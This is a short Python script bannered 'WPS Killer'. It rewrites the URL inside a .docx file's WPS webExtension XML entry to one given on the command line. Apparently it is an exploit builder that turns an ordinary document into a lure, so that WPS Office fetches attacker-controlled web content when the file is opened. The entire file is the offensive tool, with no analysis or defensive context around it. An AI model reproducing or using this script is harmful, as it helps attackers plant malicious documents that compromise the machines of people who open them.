import sys
from lxml import etree
import zipfile

def print_banner():
    banner = """
    __        ___  ____  ____  _  __ _____ _  __
    \ \      / / \|  _ \/ ___|| |/ // ____| |/ /
     \ \ /\ / / _ \ |_) \___ \| ' /| (___ | ' / 
      \ V  V / ___ \  __/ ___) | . \ \___ \| . \ 
       \_/\_/_/   \_\_| |____/|_|\_\_____) |_|\_\
                                        
    WPS Killer
    """
    print(banner)


def replace_url_in_docx(docx_path, new_url):
    # 打开docx文件
    zipf = zipfile.ZipFile(docx_path, "a")

    # 指定webExtension1.xml文件的路径
    xml_path = "word/webExtensions/webExtension1.xml"

    # 读取webExtension1.xml文件
    xml_content = zipf.read(xml_path)

    # 解析XML内容
    root = etree.fromstring(xml_content)

    # 查找并替换URL，使用正确的命名空间
    namespace = {"wpswe": "http://www.wps.cn/officeDocument/2018/webExtension"}
    url_tag = root.find(".//wpswe:url", namespaces=namespace)
    if url_tag is not None:
        url_tag.text = new_url

    # 将更改后的XML内容写回docx文件
    zipf.writestr(xml_path, etree.tostring(root))
    zipf.close()


if __name__ == "__main__":
    print_banner()

    if len(sys.argv) != 3:
        print("Usage: python script.py <path_to_docx> <new_url>")
        sys.exit(1)

    # 从命令行参数获取docx文件路径和新的URL
    docx_path = sys.argv[1]
    new_url = sys.argv[2]

    # 调用函数进行替换
    replace_url_in_docx(docx_path, new_url)
    print(f"URL replaced in {docx_path} with {new_url}")
